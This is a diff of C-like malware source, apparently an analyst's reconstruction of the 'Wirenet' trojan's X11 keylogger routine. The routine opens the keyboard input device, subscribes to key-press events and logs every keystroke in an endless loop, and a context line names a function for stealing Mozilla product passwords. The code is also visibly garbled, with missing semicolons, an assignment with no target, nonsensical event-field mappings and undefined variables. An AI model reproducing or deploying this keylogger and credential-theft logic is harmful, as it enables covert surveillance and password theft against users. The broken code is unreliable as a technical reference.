@@ -1111,53 +1111,87 @@ int32_t  __attribute__((cdecl)) cpStartKeylogger () {
 	XDevice *device;
     int32_t KEY_PRESS_TYPE;
     XKeyEvent *single_event;
+    XKeyEvent *hooks;
     Window root;
 	XEventClass event_class; // all the events we want to capture
+	XDeviceInfo *devices;
 
 	...
 
 	// LoadKeyloggerAPI:	Loads all the X11 necessary API
 	LoadKeyloggerAPI ();
 
+
+	// Connect or disconnect to X server 
+	x_server_handle = XOpenDisplay (0);
+
+	// Function determines if the named extension is present
+	asd = XQueryExtension(result, "XInputExtension", &v24, &v22, &v23)
+
+	// 
+	XListInputDevices(x_server_handle, &_devices, asd, asd)
+
 	...
 
 	// Get a list with input devices
 	XDeviceInfo *devices = XListInputDevices (display , &n_devices);
 
-
 	for (int32_t i = 0; i < n_devices; ++i) {
 
-		// The XOpenDevice request makes an input device accessible to a
-		// client through input extension protocol requests. If
-		// successful, it returns a pointer to an XDevice structure.
-
-		device = XOpenDevice( display, devices[i].id );
-		
-
-	    // DeviceKeyPress:
-	    // returns the DeviceKeyPress event type and the eventclass for
-	    // DeviceKeyPress events from the specified device.
-
-	    // This eventclass can then be used in an XSelectExtensionEvent
-	    // request to ask the server to send DeviceKeyPress events from
-	    // this device. When a selected event is received via XNextEvent,
-	    // the type can be used for comparison with the type in the event.
-
-        DeviceKeyPress( device, KEY_PRESS_TYPE, event_class );
-
-		XSelectExtensionEvent( display, root, &event_class, 1 );
-
-		// Log all keys
-		while (TRUE) {
-			// Gets an event from the 'XEvent' queue
-			NextEvent (&display, &single_event);
-			LogKey (single_event, display);
+		// Look for a device 
+		if (strstr(haystack, "System keyboard") || strstr(haystack, "System keyboard")) {
+			// Get the handle of the keyboard device
+			// The id is a number in the range 0-128 that uniquely identifies
+			// the device. It is assigned to the device when it is initialized
+			// by the server.
+			= devices.id;
 		}
+
 	}
 
-	...
+	// The XOpenDevice request makes an input device accessible to a
+	// client through input extension protocol requests. If
+	// successful, it returns a pointer to an XDevice structure.
 
+	device = XOpenDevice( display, devices[i].id );
+	
+
+    // DeviceKeyPress:
+    // returns the DeviceKeyPress event type and the eventclass for
+    // DeviceKeyPress events from the specified device.
+
+    // This eventclass can then be used in an XSelectExtensionEvent
+    // request to ask the server to send DeviceKeyPress events from
+    // this device. When a selected event is received via XNextEvent,
+    // the type can be used for comparison with the type in the event.
+
+    DeviceKeyPress( device, KEY_PRESS_TYPE, event_class );
+
+	XSelectExtensionEvent( display, root, &event_class, 1 );
+
+	// Log all keys
+	while (TRUE) {
+		// Gets an event from the 'XEvent' queue
+		// Intercept the event
+		XNextEvent (&display, &single_event);
+
+		// Acquire its information
+		hooks.type = single_event.type;
+		hooks.display = single_event.xcreatewindow.display;
+		hooks.root = single_event.xproperty.time;
+		hooks.time = single_event.xkeymap.key_vector[12];
+		hooks.y = single_event.pad[10]
+		hooks.y_root = single_event.pad[12]
+		hooks.keycode = single_event.pad[14]
+
+		// Translate it
+		LogKey (hooks, hooks, &display);
+	}
+
+	XCloseDisplay ();
+	...
 }
+
 
 // arg_0 is used to choose which Mozilla product 'Wirenet' steals from
 int32_t  __attribute__((cdecl)) GetMozillaProductPasswords (int32_t arg_0) {
